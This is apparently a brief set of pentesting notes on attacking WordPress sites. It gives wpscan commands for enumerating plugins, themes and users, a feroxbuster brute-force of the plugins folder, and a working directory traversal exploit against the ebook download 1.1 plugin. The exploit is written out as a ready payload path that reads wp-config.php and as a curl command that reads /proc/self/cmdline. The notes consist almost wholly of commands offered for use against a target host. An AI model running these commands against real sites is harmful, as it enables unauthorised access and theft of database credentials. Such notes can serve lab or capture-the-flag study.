____

```bash
wpscan --url http://$IP
```

```bash
wpscan -e ap,t,tt,u --url http://$IP --api-token $WPSCAN_API
```

# Plugins detection 

```
wpscan -e ap --plugins-detection aggressive --url http://$IP --api-token $WPSCAN_API
```

https://raw.githubusercontent.com/Perfectdotexe/WordPress-Plugins-List/master/plugins.txt

```bash
feroxbuster -u http://$IP/wp-content/plugins -w plugins.txt 
```

## ebook download 1.1 - Directory Traversal
https://www.exploit-db.com/exploits/39575

```txt
/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
```


```bash
curl http://$IP/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/self/cmdline
```
